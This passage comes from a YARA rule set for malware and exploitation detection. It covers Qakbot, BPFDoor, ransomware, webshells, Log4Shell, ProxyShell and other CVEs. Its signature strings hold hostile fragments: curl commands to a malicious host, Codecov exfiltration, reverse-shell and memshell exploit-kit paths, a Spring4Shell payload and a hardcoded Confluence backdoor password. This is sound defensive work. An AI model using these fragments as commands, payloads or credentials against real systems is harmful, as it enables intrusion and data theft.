      author = "Florian Roth"
      reference = "https://twitter.com/ankit_anubhav/status/1578257383133876225?s=20&t=Bu3CCJCzImpTGOQX_KGsdA"
      date = "2022-10-07 16:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4f384bcba31fda53e504d0a6c85cee0ce3ea9586226633d063f34c53ddeaca3f"
      hash2 = "8e61c2b751682becb4c0337f5a79b2da0f5f19c128b162ec8058104b894cae9b"
      hash3 = "c5d23d991ce3fbcf73b177bc6136d26a501ded318ccf409ca16f7c664727755a"
      tags = "DEMO, MAL, Qakbot"
      minimum_yara = "3.5.0"
      
   strings:
      $sd1 = "VUVzREJCUUFBUUFJQ" 
      $sd2 = "VFc0RCQlFBQVFBSU" 
      $sd3 = "VRXNEQkJRQUFRQUlB" 
      $sdr1 = "QJFUUBFUUCJERzVUV" 
      $sdr2 = "USBFVQBFlQCR0cFV" 
      $sdr3 = "BlUQRFUQRJkQENXRV" 
      $st1 = "VlVWelJFSkNVVUZCVVVGSl" 
      $st2 = "ZVVnpSRUpDVVVGQlVVRkpR" 
      $st3 = "WVVZ6UkVKQ1VVRkJVVUZKU" 
      $st4 = "VkZjMFJDUWxGQlFWRkJTV" 
      $st5 = "ZGYzBSQ1FsRkJRVkZCU1" 
      $st6 = "WRmMwUkNRbEZCUVZGQlNV" 
      $st7 = "VlJYTkVRa0pSUVVGUlFVbE" 
      $st8 = "ZSWE5FUWtKUlFVRlJRVWxC" 
      $st9 = "WUlhORVFrSlJRVUZSUVVsQ" 
      $str1 = "UUpGVVVCRlVVQ0pFUnpWVV" 
      $str2 = "FKRlVVQkZVVUNKRVJ6VlVW" 
      $str3 = "RSkZVVUJGVVVDSkVSelZVV" 
      $str4 = "VVNCRlZRQkZsUUNSMGNGV" 
      $str5 = "VTQkZWUUJGbFFDUjBjRl" 
      $str6 = "VU0JGVlFCRmxRQ1IwY0ZW" 
      $str7 = "QmxVUVJGVVFSSmtRRU5YUl" 
      $str8 = "JsVVFSRlVRUkprUUVOWFJW" 
      $str9 = "CbFVRUkZVUVJKa1FFTlhSV" 
      $htm = "<html" ascii
      $eml = "Content-Transfer-Encoding:" ascii
   condition: 
      filesize < 10MB and ( ( 1 of ( $sd* ) and $htm and not $eml ) or ( 1 of ( $st* ) and $eml ) )
}

rule MAL_Github_Repo_Compromise_MyJino_Ru_Aug22_RID36DA : DEMO MAL RUSSIA {
   meta:
      description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
      author = "Florian Roth"
      reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
      date = "2022-08-03 17:13:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
      $x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
   condition: 
      1 of them
}

rule VULN_Confluence_Questions_Plugin_CVE_2022_26138_Jul22_1_RID39F2 : CVE_2022_26138 DEMO VULN {
   meta:
      description = "Detects properties file of Confluence Questions plugin with static user name and password (backdoor) CVE-2022-26138"
      author = "Florian Roth"
      reference = "https://www.bleepingcomputer.com/news/security/atlassian-fixes-critical-confluence-hardcoded-credentials-flaw/"
      date = "2022-07-21 19:25:31"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2022_26138, DEMO, VULN"
      minimum_yara = "3.5.0"
      
   strings:
      $x_plain_1 = "predefined.user.password=disabled1system1user6708" 
      $jar_marker = "/confluence/plugins/questions/" 
      $jar_size_1 = { 00 CC ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 64 65 66 61 75 6C 74 2E 70 72 6F 70 65 72 74 69 65 73 50 4B } 
      $jar_size_2 = { 00 CC 00 ?? ?? ?? ?? ?? 00 64 65 66 61 75 6C 74 2E 70 72 6F 70 65 72 74 69 65 73 } 
   condition: 
      1 of ( $x* ) or ( $jar_marker and 1 of ( $jar_size* ) )
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_3_RID3892 : APT CHINA DEMO LINUX MAL {
   meta:
      description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-08 18:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "144526d30ae747982079d5d340d1ff116a7963aba2e3ed589e7ebc297ba0c1b3"
      hash2 = "fa0defdabd9fd43fe2ef1ec33574ea1af1290bd3d763fdb2bed443f2bd996d73"
      tags = "APT, CHINA, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event" ascii fullword
      $s2 = "/sbin/mingetty /dev" ascii fullword
      $s3 = "pickup -l -t fifo -u" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them or all of them
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_2_RID3891 : APT CHINA DEMO LINUX MAL {
   meta:
      description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-07 18:26:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "76bf736b25d5c9aaf6a84edd4e615796fffc338a893b49c120c0b4941ce37925"
      hash2 = "96e906128095dead57fdc9ce8688bb889166b67c9a1b8fdb93d7cff7f3836bb9"
      hash3 = "c80bd1c4a796b4d3944a097e96f384c85687daeedcdcf05cc885c8c9b279b09c"
      tags = "APT, CHINA, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $opx1 = { 48 83 c0 0c 48 8b 95 e8 fe ff ff 48 83 c2 0c 8b 0a 8b 55 f0 01 ca 89 10 c9 } 
      $opx2 = { 48 01 45 e0 83 45 f4 01 8b 45 f4 3b 45 dc 7c cd c7 45 f4 00 00 00 00 eb 2? 48 8b 05 ?? ?? 20 00 } 
      $op1 = { 48 8d 14 c5 00 00 00 00 48 8b 45 d0 48 01 d0 48 8b 00 48 89 c7 e8 ?? ?? ff ff 48 83 c0 01 48 01 45 e0 } 
      $op2 = { 89 c2 8b 85 fc fe ff ff 01 c2 8b 45 f4 01 d0 2d 7b cf 10 2b 89 45 f4 c1 4d f4 10 } 
      $op3 = { e8 ?? d? ff ff 8b 45 f0 eb 12 8b 85 3c ff ff ff 89 c7 e8 ?? d? ff ff b8 ff ff ff ff c9 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of ( $opx* ) or 4 of them
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_1_RID3890 : APT DEMO LINUX MAL T1070_003 {
   meta:
      description = "Detects unknown Linux implants (uploads from KR and MO)"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-05 18:26:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d"
      hash2 = "4c5cf8f977fc7c368a8e095700a44be36c8332462c0b1e41bff03238b2bf2a2d"
      hash3 = "599ae527f10ddb4625687748b7d3734ee51673b664f2e5d0346e64f85e185683"
      tags = "APT, DEMO, LINUX, MAL, T1070_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Connect failed." ascii fullword
      $s2 = "export MYSQL_HISTFILE=" ascii fullword
      $s3 = "udpcmd" ascii fullword
      $s4 = "getshell" ascii fullword
      $op1 = { e8 ?? ff ff ff 80 45 ee 01 0f b6 45 ee 3b 45 d4 7c 04 c6 45 ee 00 80 45 ff 01 80 7d ff 00 } 
      $op2 = { 55 48 89 e5 48 83 ec 30 89 7d ec 48 89 75 e0 89 55 dc 83 7d dc 00 75 0? } 
      $op3 = { e8 a? fe ff ff 0f b6 45 f6 48 03 45 e8 0f b6 10 0f b6 45 f7 48 03 45 e8 0f b6 00 8d 04 02 } 
      $op4 = { c6 80 01 01 00 00 00 48 8b 45 c8 0f b6 90 01 01 00 00 48 8b 45 c8 88 90 00 01 00 00 c6 45 ef 00 0f b6 45 ef 88 45 ee } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 80KB and 2 of them or 5 of them
}

rule EXPL_POC_SpringCore_0day_Indicators_Mar22_1_RID3695 : DEMO EXPLOIT SCRIPT T1033 {
   meta:
      description = "Detects indicators found after SpringCore exploitation attempts and in the POC script"
      author = "Florian Roth"
      reference = "https://twitter.com/vxunderground/status/1509170582469943303"
      date = "2022-03-30 17:02:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, SCRIPT, T1033"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di" 
      $x2 = "?pwd=j&cmd=whoami" 
      $x3 = ".getParameter(%22pwd%22)" 
      $x4 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B" 
   condition: 
      1 of them
}

rule MAL_WIPER_CaddyWiper_Mar22_1_RID308F : DEMO EXE MAL {
   meta:
      description = "Detects CaddyWiper malware"
      author = "Florian Roth"
      reference = "https://twitter.com/ESETresearch/status/1503436420886712321?s=20&t=xh8JK6fEmRIrnqO7Ih_PNg"
      date = "2022-03-15 12:45:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1e87e9b5ee7597bdce796490f3ee09211df48ba1d11f6e2f5b255f05cc0ba176"
      hash2 = "a294620543334a721a2ae8eaaf9680a0786f4b9a216d75b55cfd28f39e9430ea"
      hash3 = "ea6a416b320f32261da8dafcf2faf088924f99a3a84f7b43b964637ea87aef72"
      tags = "DEMO, EXE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { ff 55 94 8b 45 fc 50 ff 55 f8 8a 4d ba 88 4d ba 8a 55 ba 80 ea 01 } 
      $op2 = { 89 45 f4 83 7d f4 00 74 04 eb 47 eb 45 6a 00 8d 95 1c ff ff ff 52 } 
      $op3 = { 6a 20 6a 02 8d 4d b0 51 ff 95 68 ff ff ff 85 c0 75 0a e9 4e 02 00 00 } 
      $op4 = { e9 67 01 00 00 83 7d f4 05 74 0a e9 5c 01 00 00 e9 57 01 00 00 8d 45 98 50 6a 20 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 3 of them or all of them
}

rule EXPL_Log4j_CallBackDomain_IOCs_Dec21_1_RID3418 : CVE_2021_44228 DEMO EXPLOIT FILE {
   meta:
      description = "Detects IOCs found in Log4Shell incidents that indicate exploitation attempts of CVE-2021-44228"
      author = "Florian Roth"
      reference = "https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8"
      date = "2021-12-12 15:15:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_44228, DEMO, EXPLOIT, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1 = /\b(ldap|rmi):\/\/([a-z0-9\.]{1,16}\.bingsearchlib\.com|[a-z0-9\.]{1,40}\.interact\.sh|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):[0-9]{2,5}\/([aZ]|ua|Exploit|callback|[0-9]{10}|http443useragent|http80useragent)\b/ 
   condition: 
      1 of them
}

rule EXPL_JNDI_Exploit_Patterns_Dec21_1_RID3320 : DEMO EXPLOIT {
   meta:
      description = "Detects JNDI Exploit Kit patterns in files"
      author = "Florian Roth"
      reference = "https://github.com/pimps/JNDI-Exploit-Kit"
      date = "2021-12-12 14:34:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $x01 = "/Basic/Command/Base64/" 
      $x02 = "/Basic/ReverseShell/" 
      $x03 = "/Basic/TomcatMemshell" 
      $x04 = "/Basic/JettyMemshell" 
      $x05 = "/Basic/WeblogicMemshell" 
      $x06 = "/Basic/JBossMemshell" 
      $x07 = "/Basic/WebsphereMemshell" 
      $x08 = "/Basic/SpringMemshell" 
      $x09 = "/Deserialization/URLDNS/" 
      $x10 = "/Deserialization/CommonsCollections1/Dnslog/" 
      $x11 = "/Deserialization/CommonsCollections2/Command/Base64/" 
      $x12 = "/Deserialization/CommonsBeanutils1/ReverseShell/" 
      $x13 = "/Deserialization/Jre8u20/TomcatMemshell" 
      $x14 = "/TomcatBypass/Dnslog/" 
      $x15 = "/TomcatBypass/Command/" 
      $x16 = "/TomcatBypass/ReverseShell/" 
      $x17 = "/TomcatBypass/TomcatMemshell" 
      $x18 = "/TomcatBypass/SpringMemshell" 
      $x19 = "/GroovyBypass/Command/" 
      $x20 = "/WebsphereBypass/Upload/" 
      $fp1 = "<html" 
   condition: 
      1 of ( $x* ) and not 1 of ( $fp* )
}

rule EXPL_Log4j_CVE_2021_44228_Dec21_Hard_RID31D9 : CVE_2021_44228 DEMO EXPLOIT FILE {
   meta:
      description = "Detects indicators in server logs that indicate the exploitation of CVE-2021-44228"
      author = "Florian Roth"
      reference = "https://twitter.com/h113sdx/status/1469010902183661568?s=20"
      date = "2021-12-10 13:40:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-03-20"
      tags = "CVE_2021_44228, DEMO, EXPLOIT, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = /\$\{jndi:(ldap|ldaps|rmi|dns|iiop|http|nis|nds|corba):\/[\/]?[a-z-\.0-9]{3,120}:[0-9]{2,5}\/[a-zA-Z\.]{1,32}\}/ 
      $x2 = "Reference Class Name: foo" 
      $fp1r = /(ldap|rmi|ldaps|dns):\/[\/]?(127\.0\.0\.1|192\.168\.|172\.[1-3][0-9]\.|10\.)/ 
      $fpg2 = "<html" 
      $fpg3 = "<HTML" 
      $fp1 = "/QUALYSTEST" ascii
      $fp2 = "w.nessus.org/nessus" 
      $fp3 = "/nessus}" 
   condition: 
      1 of ( $x* ) and not 1 of ( $fp* )
}

rule EXPL_GitLab_CE_RCE_CVE_2021_22205_RID30B7 : CVE_2021_22205 DEMO EXPLOIT {
   meta:
      description = "Detects signs of exploitation of GitLab CE CVE-2021-22205"
      author = "Florian Roth"
      reference = "https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/"
      date = "2021-10-26 12:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_22205, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $sa1 = "VXNlci5maW5kX2J5KHVzZXJuYW1l" ascii
      $sa2 = "VzZXIuZmluZF9ieSh1c2VybmFtZ" ascii
      $sa3 = "Vc2VyLmZpbmRfYnkodXNlcm5hbW" ascii
      $sb1 = "dXNlci5hZG1pb" ascii
      $sb2 = "VzZXIuYWRtaW" ascii
      $sb3 = "1c2VyLmFkbWlu" ascii
      $sc1 = "dXNlci5zYXZlI" ascii
      $sc2 = "VzZXIuc2F2ZS" ascii
      $sc3 = "1c2VyLnNhdmUh" ascii
   condition: 
      1 of ( $sa* ) and 1 of ( $sb* ) and 1 of ( $sc* )
}

rule VULN_LNX_OMI_RCE_CVE_2021_386471_Sep21_RID320B : CVE_2021_38647 CVE_2021_386471 DEMO FILE LINUX VULN {
   meta:
      description = "Detects a Linux OMI version vulnerable to CVE-2021-38647 (OMIGOD) which enables an unauthenticated RCE"
      author = "Christian Burkard"
      reference = "https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution"
      date = "2021-09-16 13:48:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_38647, CVE_2021_386471, DEMO, FILE, LINUX, VULN"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "/opt/omi/bin/omiagent" ascii fullword
      $s1 = "OMI-1.6.8-0 - " ascii
      $s2 = "OMI-1.6.6-0 - " ascii
      $s3 = "OMI-1.6.4-1 - " ascii
      $s4 = "OMI-1.6.4-0 - " ascii
      $s5 = "OMI-1.6.2-0 - " ascii
      $s6 = "OMI-1.6.1-0 - " ascii
      $s7 = "OMI-1.5.0-0 - " ascii
      $s8 = "OMI-1.4.4-0 - " ascii
      $s9 = "OMI-1.4.3-2 - " ascii
      $s10 = "OMI-1.4.3-1 - " ascii
      $s11 = "OMI-1.4.3-0 - " ascii
      $s12 = "OMI-1.4.2-5 - " ascii
      $s13 = "OMI-1.4.2-4 - " ascii
      $s14 = "OMI-1.4.2-3 - " ascii
      $s15 = "OMI-1.4.2-2 - " ascii
      $s16 = "OMI-1.4.2-1 - " ascii
      $s17 = "OMI-1.4.1-1 - " ascii
      $s18 = "OMI-1.4.1-0 - " ascii
      $s19 = "OMI-1.4.0-6 - " ascii
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and $a1 and 1 of ( $s* )
}

rule LOG_EXPL_Confluence_RCE_CVE_2021_26084_Sep21_RID34D3 : CVE_2021_26084 DEMO EXPLOIT LOG {
   meta:
      description = "Detects exploitation attempts against Confluence servers abusing a RCE reported as CVE-2021-26084"
      author = "Florian Roth"
      reference = "https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md"
      date = "2021-09-01 15:47:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_26084, DEMO, EXPLOIT, LOG"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1 = /isSafeExpression Unsafe clause found in \['[^\n]{1,64}\\u0027/ ascii wide
      $xs1 = "[util.velocity.debug.DebugReferenceInsertionEventHandler] referenceInsert resolving reference [$!queryString]" 
      $xs2 = "userName: anonymous | action: createpage-entervariables ognl.ExpressionSyntaxException: Malformed OGNL expression: '\\' [ognl.TokenMgrError: Lexical error at line 1" 
      $sa1 = "GET /pages/doenterpagevariables.action" 
      $sb1 = "%5c%75%30%30%32%37" 
      $sb2 = "\\u0027" 
      $sc1 = " ERROR " 
      $sc2 = " | userName: anonymous | action: createpage-entervariables" 
      $re1 = /\[confluence\.plugins\.synchrony\.SynchronyContextProvider\] getContextMap (\n )?-- url: \/pages\/createpage-entervariables\.action/ 
   condition: 
      1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) ) or ( all of ( $sc* ) and $re1 )
}

rule WEBSHELL_ASPX_ProxyShell_Aug21_3_RID31EC : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects webshells dropped by ProxyShell exploitation based on their file header (must be DER), size and content"
      author = "Max Altgelt"
      reference = "https://twitter.com/gossithedog/status/1429175908905127938?s=12"
      date = "2021-08-23 13:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Page Language=" ascii nocase
   condition: 
      uint16 ( 0 ) == 0x8230 and filesize < 10KB and $s1
}

rule EXPL_Exchange_ProxyShell_Failed_Aug21_1_RID3558 : DEMO EXPLOIT SCRIPT {
   meta:
      description = "Detects ProxyShell exploitation attempts in log files"
      author = "Florian Roth"
      reference = "https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html"
      date = "2021-08-08 16:09:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2021-08-09"
      tags = "DEMO, EXPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1 = / \/autodiscover\/autodiscover\.json[^\n]{1,300}\/(powershell|mapi\/nspi|EWS\/|X-Rps-CAT)[^\n]{1,400}401 0 0/ ascii nocase
      $xr3 = /Email=autodiscover\/autodiscover\.json[^\n]{1,400}401 0 0/ ascii nocase
   condition: 
      1 of them
}

rule EXPL_Exchange_ProxyShell_Successful_Aug21_1_RID3733 : DEMO EXPLOIT SCRIPT {
   meta:
      description = "Detects successful ProxyShell exploitation attempts in log files"
      author = "Florian Roth"
      reference = "https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html"
      date = "2021-08-08 17:28:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-03-21"
      tags = "DEMO, EXPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1a = / \/autodiscover\/autodiscover\.json[^\n]{1,300}\/(powershell|X-Rps-CAT)/ ascii nocase
      $xr1b = / \/autodiscover\/autodiscover\.json[^\n]{1,300}\/(mapi\/nspi|EWS\/)[^\n]{1,400}(200|302) 0 0/ 
      $xr2 = /autodiscover\/autodiscover\.json[^\n]{1,60}&X-Rps-CAT=/ ascii nocase
      $xr3 = /Email=autodiscover\/autodiscover\.json[^\n]{1,400}200 0 0/ ascii nocase
   condition: 
      1 of them
}

rule APT_MAL_REvil_Kaseya_Jul21_2_RID30AB : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware used in the Kaseya supply chain attack"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b"
      date = "2021-07-02 12:49:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0496ca57e387b10dfdac809de8a4e039f68e8d66535d5d19ec76d39f7d0a4402"
      hash2 = "8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd"
      hash3 = "cc0cdc6a3d843e22c98170713abf1d6ae06e8b5e34ed06ac3159adafe85e3bd6"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $opa1 = { 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 } 
      $opa2 = { 89 45 f0 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 } 
      $opa3 = { 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 0f b6 14 01 } 
      $opa4 = { 89 45 f4 8b 0d ?? ?0 07 10 89 4d f8 8b 15 ?? ?1 07 10 89 55 fc ff 75 fc ff 75 f8 ff 55 f4 } 
      $opb1 = { 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc cc } 
      $opb2 = { 18 00 10 0e 19 00 10 cc cc cc cc 8b 44 24 04 } 
      $opb3 = { 10 c4 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 2 of ( $opa* ) or 3 of them )
}

rule EXPL_CVE_2021_31166_Accept_Encoding_May21_1_RID34B9 : CVE_2021_31166 DEMO EXPLOIT {
   meta:
      description = "Detects malformed Accept-Encoding header field as used in code exploiting CVE-2021-31166"
      author = "Florian Roth"
      reference = "https://github.com/0vercl0k/CVE-2021-31166"
      date = "2021-05-21 15:42:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_31166, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1 = /[Aa]ccept\-[Ee]ncoding: [a-z\-]{1,16},([a-z\-\s]{1,16},|)*[\s]{1,20},/ 
   condition: 
      1 of them
}

rule MAL_RANSOM_Darkside_May21_1_RID3019 : CRIME DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects Darkside Ransomware"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/020c1740-717a-4191-8917-5819aa25f385/"
      date = "2021-05-10 12:25:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ec368752c2cf3b23efbfa5705f9e582fc9d6766435a7b8eea8ef045082c6fbce"
      tags = "CRIME, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 85 c9 75 ed ff 75 10 ff b5 d8 fe ff ff ff b5 dc fe ff ff e8 7d fc ff ff ff 8d cc fe ff ff 8b 8d cc fe ff ff } 
      $op2 = { 66 0f 6f 06 66 0f 7f 07 83 c6 10 83 c7 10 49 85 c9 75 ed 5f } 
      $op3 = { 6a 00 ff 15 72 0d 41 00 ab 46 81 fe 80 00 00 00 75 2e 6a ff 6a 01 } 
      $op4 = { 0f b7 0c 5d 88 0f 41 00 03 4c 24 04 89 4c 24 04 83 e1 3f 0f b7 14 4d 88 0f 41 00 03 54 24 08 89 54 24 08 83 e2 3f } 
      $s1 = "http://darksid" ascii
      $s2 = "[ Welcome to DarkSide ]" ascii
      $s3 = ".onion/" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them or all of ( $op* ) or all of ( $s* )
}

rule APT_UNC2447_MAL_RANSOM_HelloKitty_May21_2_RID3456 : APT CRIME DEMO EXE MAL RANSOM {
   meta:
      description = "Detects HelloKitty Ransomware samples from UNC2447 campaign"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html"
      date = "2021-05-01 15:26:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "10887d13dba1f83ef34e047455a04416d25a83079a7f3798ce3483e0526e3768"
      hash2 = "3ae7bedf236d4e53a33f3a3e1e80eae2d93e91b1988da2f7fcb8fde5dcc3a0e9"
      hash3 = "501487b025f25ddf1ca32deb57a2b4db43ccf6635c1edc74b9cff54ce0e5bcfe"
      tags = "APT, CRIME, DEMO, EXE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $xop1 = { 50 8d 45 f8 50 ff 75 fc ff 15 ?? ?? 42 00 3d ea 00 00 00 75 18 83 7d f8 00 } 
      $s1 = "HelloKittyMutex" wide
      $s2 = "%s\\read_me_lkd.txt" wide fullword
      $s3 = "/C ping 127.0.0.1 & del %s" wide fullword
      $s4 = "(%d) [%d] %s: STOP DOUBLE PROCESS RUN" ascii fullword
      $sop1 = { 6a 00 6a 01 ff 75 fc ff 15 ?? ?? 42 00 85 c0 0f 94 c3 ff 75 fc ff 15 ?? ?? 42 00 } 
      $sop2 = { 74 12 6a 00 6a 01 ff 75 fc ff 15 ?? ?? 42 00 85 c0 0f 94 c3 ff 75 fc } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of ( $x* ) or 2 of them
}

rule APT_SH_CodeCov_Hack_Apr21_1_RID303D : APT DEMO FILE SCRIPT T1059_004 {
   meta:
      description = "Detects manipulated Codecov bash uploader tool that has been manipulated by an unknown actor during March / April 2021"
      author = "Florian Roth"
      reference = "https://about.codecov.io/security-update/"
      date = "2021-04-16 12:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, SCRIPT, T1059_004"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "Global report uploading tool for Codecov" 
      $s1 = "curl -sm 0.5 -d" 
   condition: 
      uint16 ( 0 ) == 0x2123 and filesize < 70KB and all of them
}

rule WEBSHELL_ASPX_FileExplorer_Mar21_1_RID32A4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Chopper like ASPX Webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-31 14:13:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "<span style=\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\" onclick=" ascii
      $xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64 20 72 75 6E 61 74 3D 22 73 65 72 76 65 72 22 20 49 44 3D 22 ?? ?? ?? ?? ?? 22 20 2F 3E 3C 62 72 20 2F 3E 3C 62 72 20 2F 3E 20 50 72 6F 63 65 73 73 20 4E 61 6D 65 3A 3C 61 73 70 3A 54 65 78 74 42 6F 78 20 49 44 3D } 
